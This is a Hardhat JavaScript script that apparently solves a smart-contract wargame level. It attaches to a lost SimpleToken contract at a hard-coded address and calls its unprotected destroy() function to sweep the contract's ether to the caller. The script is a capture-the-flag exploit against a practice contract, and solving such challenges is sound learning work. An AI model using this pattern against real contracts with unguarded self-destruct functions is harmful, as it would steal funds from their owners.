// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.
const { ethers } = require("hardhat");
const hre = require("hardhat");

async function main() {
    // Gate 2 is damn tricky. After wasting sometime, decided to pick this level later
    const INSTANCE_ADDRESS = '0x39CB3ccd85f7AA303011F22E97d372417a2A51db';
    // get the address from etherscan internal transactions
    const CONTRACT_ADDRESS = '0xBAf33b63BcA1Ca900E67Db6882E46B6BeCE05b6F';
    const [owner, addr1] = await ethers.getSigners();

    const SimpleToken = await hre.ethers.getContractFactory("SimpleToken");
    const simpleToken = SimpleToken.attach(CONTRACT_ADDRESS);

    console.log(await ethers.provider.getBalance(CONTRACT_ADDRESS));

    const tx = await simpleToken.destroy(owner.address);
    console.log(tx);
    await tx.wait()

    console.log(await ethers.provider.getBalance(CONTRACT_ADDRESS));
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
